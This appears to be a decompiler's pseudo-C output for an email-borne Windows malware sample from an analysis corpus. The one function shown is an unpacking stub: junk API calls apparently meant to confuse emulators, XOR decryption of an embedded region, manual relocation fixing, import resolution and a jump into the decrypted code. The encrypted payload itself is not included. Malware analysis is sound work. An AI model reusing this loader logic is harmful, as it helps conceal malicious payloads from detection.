// subject.c
// Generated on 5/4/2015 12:23:22 AM by decompiling malware_via_email/malware_0107/ia32_pe/subject.exe
// using Decompiler version 0.4.2.0.

#include "subject.h"

void fn00401000(word32 edx)
{
fn00401000_entry:
l00401000:
	word32 esi_387 = AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + 0x00000025 + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000)
	word32 ebx_15 = 0x00000000
	branch AreAnyAccessesGranted(0xFFFFFFFF, 0xFFFFFFFF) != 0x00000000 l00401122
l0040111F:
	esi_387 = esi_387 - 0x00000022
l00401122:
	word32 ecx_399 = 0x00000000
l00401127:
	branch ebx_15 != esi_387 l00401130
l0040112E:
	ebx_15 = 0x00000000
l00401130:
	byte v15_417 = Mem0[ecx_399 + 0x004012B0:byte] ^ Mem0[ebx_15 + 0x00404000:byte]
	Mem418[ecx_399 + 0x004012B0:byte] = v15_417
	ecx_399 = ecx_399 + 0x00000001
	ebx_15 = ebx_15 + 0x00000001
	branch ecx_399 <u 0x00001420 l00401127
l0040114A:
	word32 edx_427 = 0x00402590
	word32 dwLoc0C_430 = 0x00000000
l00401170:
	word32 eax_438 = Mem418[edx_427 + 0x00000004:word32]
	word32 ecx_445 = edx_427 + 0x00000008
	branch eax_438 - 0x00000008 >>u 0x00000001 <= 0x00000000 l004011A7
l0040117F:
	word32 esi_642 = eax_438 - 0x00000008 >>u 0x00000001
l00401181:
	branch (Mem418[ecx_445 + 0x00000000:word16] & 0xF000) != 0x3000 l0040119F
l0040118E:
	word32 eax_660 = ((word32) Mem418[ecx_445 + 0x00000000:word16] & 0x00000FFF) + Mem418[edx_427 + 0x00000000:word32]
	Mem663[eax_660 + 0x00401030:word32] = Mem418[eax_660 + 0x00401030:word32] + 0xF0401030
l0040119F:
	ecx_445 = ecx_445 + 0x00000002
	esi_642 = esi_642 - 0x00000001
	branch esi_642 != 0x00000000 l00401181
l004011A7:
	word32 eax_450 = Mem418[edx_427 + 0x00000004:word32]
	word32 ecx_452 = dwLoc0C_430 + eax_450
	word32 edx_453 = edx_427 + eax_450
	branch ecx_452 <u 0x000000E4 l00401170
	word32 eax_457 = Mem418[edx_453 + 0x00000004:word32]
	word32 ecx_459 = ecx_452 + eax_457
	edx_427 = edx_453 + eax_457
	dwLoc0C_430 = ecx_459
	branch ecx_459 <u 0x000000E4 l00401170
l004011BE:
	branch Mem418[0x00401D9C:word32] == 0x00000000 l0040126E
	word32 ebx_469 = 0x00401D8C
	word32 dwLoc0C_470 = 0x00401D8C
	ebx_500 = ebx_469
	branch Mem418[0x00401D9C:word32] == 0x00000000 l0040126E
l004011D5:
	word32 ebx_500
	word32 eax_505 = LoadLibraryA(Mem418[ebx_500 + 0x0000000C:word32] + 0x00401030)
	CloseHandle(0x00000062)
	CloseHandle(0x00000062)
	branch eax_505 == 0x00000000 l0040125D
	word32 eax_524 = LoadLibraryA(Mem418[ebx_500 + 0x0000000C:word32] + 0x00401030)
	CloseHandle(0x00000062)
	CloseHandle(0x00000062)
	branch eax_524 == 0x00000000 l0040125D
l004011FC:
	branch Mem418[ebx_500 + 0x00000000:word32] != 0x00000000 l00401205
	word32 ebp_563 = Mem418[ebx_500 + 0x00000000:word32]
	branch ebp_563 != 0x00000000 l00401205
l00401202:
	ebp_563 = Mem418[ebx_500 + 0x00000010:word32]
l00401205:
	word32 ebp_569 = ebp_563 + 0x00401030
	word32 ebx_570 = Mem418[ebx_500 + 0x00000010:word32] + 0x00401030
	branch Mem418[ebp_569 + 0x00000000:word32] == 0x00000000 l00401259
l00401212:
	word32 eax_603 = Mem418[ebp_569 + 0x00000000:word32]
	word16 ax_605 = (word16) eax_603
	branch eax_603 >= 0x00000000 l00401234
l0040121C:
	Mem630[ebx_570 + 0x00000000:word32] = GetProcAddress(eax_524, (word32) ax_605)
	goto l00401246
l00401234:
	Mem639[ebx_570 + 0x00000000:word32] = GetProcAddress(eax_524, eax_603 + 0x00401032)
l00401246:
	ebp_569 = ebp_569 + 0x00000004
	ebx_570 = ebx_570 + 0x00000004
	branch Mem418[ebp_569 + 0x00000000:word32] != 0x00000000 l00401212
l00401259:
	ebx_500 = dwLoc0C_470
l0040125D:
	ebx_500 = ebx_500 + 0x00000014
	dwLoc0C_470 = ebx_500
	branch Mem418[ebx_500 + 0x00000010:word32] != 0x00000000 l004011D5
l0040126E:
	call 0x00401A80 (retsize: 4; depth: 32)
	ExitProcess(0x00000000)
	int3()
fn00401000_exit:
}

